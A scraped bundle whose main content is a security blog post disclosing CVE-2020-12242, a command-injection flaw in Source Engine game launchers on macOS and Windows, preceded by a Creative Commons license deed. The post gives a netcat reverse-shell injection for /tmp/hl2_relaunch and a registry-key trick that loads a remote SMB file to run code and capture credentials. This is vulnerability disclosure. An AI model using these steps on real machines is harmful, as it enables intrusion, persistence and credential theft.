=== Content from creativecommons.org_a0ebbeaf_20250119_140206.html ===

[Skip to content](#main-content-marker)

# [Creative Commons](/)

Menu

* [Who We Are](/about/team)
* [What We Do](/about)
* [Licenses and Tools](/about/cclicenses/)
* [Blog](/blog)
* [Support Us](/about/support-cc/)

* Languages available

  aragonÃ©s

  AzÉrbaycanca

  Bahasa Indonesia

  Basque

  catalÃ

  dansk

  Deutsch

  eesti

  English

  espaÃ±ol

  Esperanto

  franÃ§ais

  frysk

  Gaeilge

  galego

  Hrvatski

  italiano

  latvieÅ¡u

  LietuviÅ¡kai

  Magyar

  Melayu

  Nederlands

  norsk

  polski

  PortuguÃªs

  PortuguÃªs Brasileiro

  RomÃ¢nÄ

  Slovensky

  SlovenÅ¡Äina

  srpski (latinica)

  suomi

  svenska

  TÃ¼rkÃ§e

  Ãslenska

  Äesky

  ÎÎ»Î»Î·Î½Î¹ÎºÎ¬

  Ð±ÐµÐ»Ð°ÑÑÑÐºÐ°Ñ

  Ð±ÑÐ»Ð³Ð°ÑÑÐºÐ¸

  Ð ÑÑÑÐºÐ¸Ð¹

  Ð£ÐºÑÐ°ÑÐ½ÑÑÐºÐ°

  Ø§ÙØ¹Ø±Ø¨ÙÙØ©

  ÙØ§Ø±Ø³Û

  à¤¹à¤¿à¤à¤¦à¥

  à¦¬à¦¾à¦à¦²à¦¾

  æ¥æ¬èª

  ç®ä½ä¸­æ

  ç¹é«ä¸­æ

  íêµ­ì´
* [Search](/?s)
* [Donate](https://www.classy.org/give/313412/#!/donation/checkout?c_src=website&c_src2=top-of-page-banner)
* Explore CC

* [Global Network](https://network.creativecommons.org/)

  Join a global community working to strengthen the Commons
* [Certificate](https://certificate.creativecommons.org/)

  Become an expert in creating and engaging with openly licensed materials
* [Global Summit](https://summit.creativecommons.org/)

  Attend our annual event, promoting the power of open licensing
* [Chooser](/choose)

  Get help choosing the appropriate license for your work
* [Search Portal](https://search.creativecommons.org/)

  Find engines to search openly licensed material for creative and educational reuse
* [Open Source](https://opensource.creativecommons.org/)

  Help us build products that maximize creativity and innovation

Help us protect the commons. Make a tax deductible gift to fund our work in 2025.
[Donate today!](https://www.classy.org/give/313412/#!/donation/checkout?c_src=website&c_src2=temp-banner)

# Attribution 4.0 International

CC BY 4.0

## Deed

## Canonical URL

<https://creativecommons.org/licenses/by/4.0/>

[See the legal code](legalcode.en)

## You are free to:

1. **Share**
   â copy and redistribute the material in any medium or format
   for any purpose, even commercially.
2. **Adapt**
   â remix, transform, and build upon the material
   for any purpose, even commercially.
3. The licensor cannot revoke these freedoms as long as you follow the license terms.

## Under the following terms:

1. **Attribution**
   â
   You must give
   [appropriate credit](#ref-appropriate-credit)
   , provide a link to the license, and
   [indicate if changes were made](#ref-indicate-changes)

   . You may do so in any reasonable manner, but not in any way that suggests the licensor endorses you or your use.
2. **No additional restrictions**
   â You may not apply legal terms or
   [technological measures](#ref-technological-measures)
   that legally restrict others from doing anything the license permits.

## Notices:

You do not have to comply with the license for elements of the material in the public domain or where your use is permitted by an applicable
[exception or limitation](#ref-exception-or-limitation)
.

No warranties are given. The license may not give you all of the permissions necessary for your intended use. For example, other rights such as
[publicity, privacy, or moral rights](#ref-publicity-privacy-or-moral-rights)
may limit how you use the material.

## Notice

This deed highlights only some of the key features and terms of the actual license. It is not a license and has no legal value. You should carefully review all of the terms and conditions of the actual license before using the licensed material.

Creative Commons is not a law firm and does not provide legal services. Distributing, displaying, or linking to this deed or the license that it summarizes does not create a lawyer-client or any other relationship.

Creative Commons is the nonprofit behind the open licenses and other legal tools that allow creators to share their work. Our legal tools are free to use.

* [Learn more about our work](/about/)
* **[Learn more about CC Licensing](/share-your-work/cclicenses/)**
* [Support our work](/donate/)
* [Use the license for your own material.](/choose/)
* [Licenses List](/licenses/list.en)
* [Public Domain List](/publicdomain/list.en)

## Footnotes

* [return to reference](#src-appropriate-credit)
  **appropriate credit**
  â
  If supplied, you must provide the name of the creator and attribution parties, a copyright notice, a license notice, a disclaimer notice, and a link to the material. CC licenses prior to Version 4.0 also require you to provide the title of the material if supplied, and may have other slight differences.
  + [More info](https://wiki.creativecommons.org/License_Versions#Detailed_attribution_comparison_chart)
* [return to reference](#src-indicate-changes)
  **indicate if changes were made**
  â
  In 4.0, you must indicate if you modified the material and retain an indication of previous modifications. In 3.0 and earlier license versions, the indication of changes is only required if you create a derivative.
  + [Marking guide](https://wiki.creativecommons.org/Best_practices_for_attribution#This_is_a_good_attribution_for_material_you_modified_slightly)
  + [More info](https://wiki.creativecommons.org/License_Versions#Modifications_and_adaptations_must_be_marked_as_such )
* [return to reference](#src-technological-measures)
  **technological measures**
  â
  The license prohibits application of effective technological measures, defined with reference to Article 11 of the WIPO Copyright Treaty.
  + [More info](https://wiki.creativecommons.org/License_Versions#Application_of_effective_technological_measures_by_users_of_CC-licensed_works_prohibited)
* [return to reference](#src-exception-or-limitation)
  **exception or limitation**
  â
  The rights of users under exceptions and limitations, such as fair use and fair dealing, are not affected by the CC licenses.
  + [More info](https://wiki.creativecommons.org/Frequently_Asked_Questions#Do_Creative_Commons_licenses_affect_exceptions_and_limitations_to_copyright.2C_such_as_fair_dealing_and_fair_use.3F)
* [return to reference](#src-publicity-privacy-or-moral-rights)
  **publicity, privacy, or moral rights**
  â
  You may need to get additional permissions before using the material as you intend.
  + [More info](https://wiki.creativecommons.org/Considerations_for_licensors_and_licensees)

[Creative Commons](/)

* [Contact](/about/contact)
* [Newsletter](https://mail.creativecommons.org/subscribe)
* [Privacy](/privacy)
* [Policies](/policies)
* [Terms](/terms)

## Contact Us

Creative Commons PO Box 1866, Mountain View, CA 94042

info@creativecommons.org

+1-415-429-6753

* [Bluesky](https://bsky.app/profile/creativecommons.bsky.social)
* [Mastodon](https://mastodon.social/%40creativecommons)
* [Facebook](https://www.facebook.com/creativecommons)
* [LinkedIn](https://www.linkedin.com/company/creative-commons/)

## Subscribe to our Newsletter

## Support Our Work

Our work relies on you! Help us keep the Internet free and open.

[Donate Now](https://www.classy.org/give/313412/#!/donation/checkout?c_src=website&c_src2=top-of-page-banner)

Except where otherwise
[noted](/policies/#license)
, content on this site is licensed under a
[Creative Commons Attribution 4.0 International license](/licenses/by/4.0/)
. Icons by
[Font Awesome](https://fontawesome.com/)
.



=== Content from twitter.com_c7e00ae7_20250119_140206.html ===



=== Content from 0xem.ma_d96dd507_20250119_122331.html ===


[![avatar](https://0xem.ma/assets/IMG_40132.jpg)](/)
# [0xEmma's Blog](/)

Kubernetes n Things

* [HOME](/)
* [CATEGORIES](/categories/)
* [TAGS](/tags/)
* [ARCHIVES](/archives/)
* [ABOUT](/about/)

[Home](/)

Source Engine LPE/Arbitrary Code Execution; CVE-2020-12242

Post

Cancel

# Source Engine LPE/Arbitrary Code Execution; CVE-2020-12242

Posted

Apr 27, 2020

By
*[Emma Ruby](https://twitter.com/0xemma)*

*3 min* read

# Code Execution within Source Engine Game

---

#### CVE: CVE-2020-12242

---

#### Affected Products

---

##### Tested:

CS:GO BuildID: 4937372 -> Current

TF2 BuildID: 4871679 -> Current

Garryâs Mod BuildID: 4803834 -> Current

Half Life 2 BuildID: 4233302 - > Current

Note: this vulnerability seems to date back further then the listed build numbers, however i have only tested back to them

#### Notes:

This seems to be a issue within the source engine itself and should be present within all source games. However I have only tested the games listed above.

---

#### Vulnerability Explanation in Short

TL;DR Within MacOS place `";nc -e /bin/bash ip port"`(or whatever you want for shell) into `/tmp/hl2_relaunch`, open and close CS:GO and you have a shell on MacOS as whoever runs the game. On Windows add a registry key named `Relaunch URL` to `Computer\HKEY_CURRENT_USER\Software\Valve\Source`, however we can only call programs, thankfully we can use SMB/Any UNC Path to call a remote file(and get creds while were at it), so set it to \\ip\share\file and boom

#### More Technical Explanation

Within The CS:GO Source code leak, you can find the affected file at launcher/launcher.cpp
[![](https://emma.is-a-bad-waifu.com/6184nQ4.png)](https://emma.is-a-bad-waifu.com/6184nQ4.png)
Lines 1939 -> 1974 are the affected functions. See screenshot of code above.

However on line 98, the file is defined for OSX

[![OSX File Selection](https://emma.is-a-bad-waifu.com/5QWaZMR.png)](https://emma.is-a-bad-waifu.com/5QWaZMR.png)

On OSX, the launcher checks to see if the file â/tmp/hl2\_relaunchâ exists, if it does then it creates the szCMD variable. If the file has stuff within it(it 99.9% of the time will), then it will add âopenâ too the start and send it out as a system call. The issue with this is that their is *no* input validation. Meaning as I showed before, we can just add `;` and itâll execute anything we wish after.

For Windows, it checks to see if the registry key HKEY\_Current\_User\Software\Valve\Source, exists, then if it does if ReLaunch URL Exists within it, if it does call the ShellExecute Open function with the value of the registry key(Docs for shell execute [here](https://docs.microsoft.com/en-us/windows/win32/shell/launch)), this means itll run a executable, or open the attached program. and since the values â0, 0â are set we are unable to add parameters. However we are able to specify a remote SMB Path, so if we set the registry key to a SMB server we control containing a malicious file (I tested with a .bat running a rev shell command), using this method we can also fetch users credentials.

#### Closing Notes

---

This issues was reported to Valve on 22/04/2020 via HackerOne and denied due to

[![](https://emma.is-a-bad-waifu.com/AAbvJvk.png)](https://emma.is-a-bad-waifu.com/AAbvJvk.png)

Which, I find very confusing, since that line of the scope was taken from the following

[![](https://emma.is-a-bad-waifu.com/6YxcviY.png)](https://emma.is-a-bad-waifu.com/6YxcviY.png)

Which states **RCE** Must follow those 3 statements, not a LPE, or a Local Arbitrary Code Execution(depends on how you classify the bug). While I do see that this bug would have a low broader impact, in certain scenarios it could have a more serious impacts. As a example a dev could self-host a web server on their machine and it could be compromised, this bug would allow them to place the file in /tmp as www-data and get a shell as the user who plays CS:GO(or any source game) next, or this could also be used as a way to maintain access to a box. Set the file in the tmp and if you lose the shell just wait for them to play CS:GO(or any source game). Anyways, that is why this is being disclosed this way instead of via Hackerone.

As a additional note this was a collaborative effort between Me(0xEmma), [BugByt3](https://bugb.yt/blog/cve-2020-12242) and [sebastianpc](https://sebastianpc.tech/2020/04/27/CVE-2020-12242-Source-Engine-privilege-escalation.html).

[CVE](//categories/cve/)

This post is licensed under
[CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
by the author.

Share

## Recently Updated

* [Selling Extra HomeLab Storage Capacity with StorJ/Sia](/posts/Storage-Selling/)
* [Journey to Kubestronaut #1 - CKA](/posts/CKA/)
* [HH3K CVEs](/posts/HH3K-CVE/)
* [MetalLB on K3S, with a UDM SE](/posts/MetalLB-UDM-SE/)
* [RClone as CSI on K3S](/posts/CSI-Rclone/)

### Further Reading

[Jan 31, 2020
#### CVE-2020-8510; Insecure Access Control Within phpABook

CVE-2020-8510 phpABook 0.9 intermediate Auth Bypass
Within the phpABook(v0.9i) software, upon authentication a cookie with the name âuserInfoâ is set in your browser with the format of user+perms...](/posts/CVE-2020-8510/)

[My OSCP Course/Exam Review, A 15 year olds perspective](//posts/OSCP-Review/)
[RClone as CSI on K3S](//posts/CSI-Rclone/)

Â©
2024
[Emma Ruby](https://twitter.com/0xemma).
Some rights reserved.

Using the [Chirpy](https://github.com/cotes2020/jekyll-theme-chirpy "v7.0.1") theme for [Jekyll](https://jekyllrb.com).


